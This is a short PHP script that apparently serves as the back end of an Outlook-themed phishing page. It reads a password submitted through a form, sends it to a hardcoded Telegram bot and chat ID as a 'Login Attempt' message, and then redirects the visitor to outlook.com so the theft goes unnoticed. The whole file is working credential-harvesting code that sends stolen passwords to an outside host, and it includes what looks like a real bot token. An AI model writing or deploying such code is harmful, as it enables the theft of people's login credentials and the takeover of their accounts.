<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST['password'];

    // Send message to Telegram bot
    $telegramBotToken = "7007690695:AAE5cDCHrhQoX4r-PIl1Xv1wWxvetxxrnTo";
    $telegramChatId = "6339299057"; // Replace this with your actual chat ID
    $telegramMessage = "Login Attempt:\nPassword: $password";

    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $telegramApiParams = http_build_query([
        'chat_id' => $telegramChatId,
        'text' => $telegramMessage
    ]);

    // Make HTTP POST request to Telegram API
    $telegramApiResponse = file_get_contents($telegramApiUrl . '?' . $telegramApiParams);

    // Redirect to Outlook
    header("Location: https://www.outlook.com");
    exit();
}
?>
